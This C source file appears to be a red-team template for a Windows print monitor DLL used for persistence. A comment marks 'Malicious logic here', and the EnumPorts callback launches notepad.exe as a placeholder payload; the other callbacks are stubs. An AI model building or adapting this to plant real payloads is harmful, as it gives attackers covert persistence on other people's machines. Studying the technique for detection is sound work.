#include <windows.h>
#include <stdio.h>
#include "MonitorDefs.h"	

//Template taken from https://stmxcsr.com/persistence/print-monitor.html
// Malicious logic here
BOOL WINAPI CsEnumPorts(HANDLE hMonitor, LPWSTR pName, DWORD Level, LPBYTE pPorts, DWORD cbBuf, LPDWORD pcbNeeded, LPDWORD pcReturned)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	SecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	SecureZeroMemory(&pi, sizeof(pi));
	const wchar_t* tp = L"notepad.exe";
	CreateProcess((LPWSTR)tp, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	
	return TRUE;
}

BOOL WINAPI CsOpenPort(HANDLE hMonitor, LPWSTR pName, PHANDLE pHandle)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL WINAPI CsOpenPortEx(HANDLE hMonitor, HANDLE hMonitorPort, LPTSTR pszPortName, LPTSTR pszPrinterName, LPHANDLE pHandle, LPMONITOR2 pMonitor)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsStartDocPort(HANDLE hPort, LPWSTR pPrinterName, DWORD JobId, DWORD Level, LPBYTE pDocInfo)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsWritePort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuf, LPDWORD pcbWritten)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsReadPort(HANDLE hPort, LPBYTE pBuffer, DWORD cbBuffer, LPDWORD pcbRead)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsEndDocPort(HANDLE hPort)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsClosePort(HANDLE hPort)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsGetPrinterDataFromPort(HANDLE hPort, DWORD ControlID, LPWSTR pValueName, LPWSTR lpInBuffer, DWORD cbInBuffer, LPWSTR lpOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbReturned)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL CsSetPortTimeOuts(HANDLE hPort, LPCOMMTIMEOUTS lpCTO, DWORD reserved)
{
	BOOL bRet = TRUE;

	return bRet;
}

BOOL WINAPI CsXcvOpenPort(HANDLE hMonitor, LPCWSTR pszObject, ACCESS_MASK GrantedAccess, PHANDLE phXcv)
{
	BOOL bRet = TRUE;

	return bRet;
}

DWORD CsXcvDataPort(HANDLE hXcv, LPCWSTR pszDataName, PBYTE pInputData, DWORD cbInputData, PBYTE pOutputData, DWORD cbOutputData, PDWORD pcbOutputNeeded)
{
	// ERROR_SUCESS
	return 0;
}

BOOL CsXcvClosePort(HANDLE hXcv)
{
	BOOL bRet = TRUE;

	return bRet;
}

VOID CsShutdown(HANDLE hMonitor)
{

}

DWORD CsSendRecvBidiDataFromPort(HANDLE hPort, DWORD dwAccessBit, LPCWSTR pAction, PBIDI_REQUEST_CONTAINER pReqData, PBIDI_RESPONSE_CONTAINER* ppResData)
{
	// ERROR_SUCCESS
	return 0;
}

MONITOR2 Moni =
{
	sizeof(MONITOR2),
	CsEnumPorts, // EnumPorts
	CsOpenPort, // OpenPort
	CsOpenPortEx, // OpenPortEx
	CsStartDocPort, // StatDocPort
	CsWritePort, // WritePort
	CsReadPort, // ReadPort
	CsEndDocPort, // EndDocPort
	CsClosePort, // ClosePort
	NULL, // AddPort -> obsolete should not be used
	NULL, // AddoPortEx -> obsolete must be NULL
	NULL, // ConfigurePort -> obsolete should not be used
	NULL, // DeletePort -> obsolete should not be used
	CsGetPrinterDataFromPort, // GetPrinterDataFromPort
	CsSetPortTimeOuts, // SetPortTimeOuts
	CsXcvOpenPort, // XcvOpenPort | Port Monitors Only
	CsXcvDataPort, // XcvDataPort | Port Monitors Only
	CsXcvClosePort, // XcvClosePort | Port Monitors Only
	CsShutdown, // Shutdown
	CsSendRecvBidiDataFromPort, // SendRecvBidiDataFromPort
	NULL, // NotifyUsedPorts
	NULL, // NotifyUnusedPorts
	NULL  // PowerEvent
};



__declspec(dllexport) LPMONITOR2 InitializePrintMonitor2(PMONITORINIT pMonitorInit, PHANDLE phMonitor)
{

	*phMonitor = (PHANDLE)pMonitorInit;

	return &Moni;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}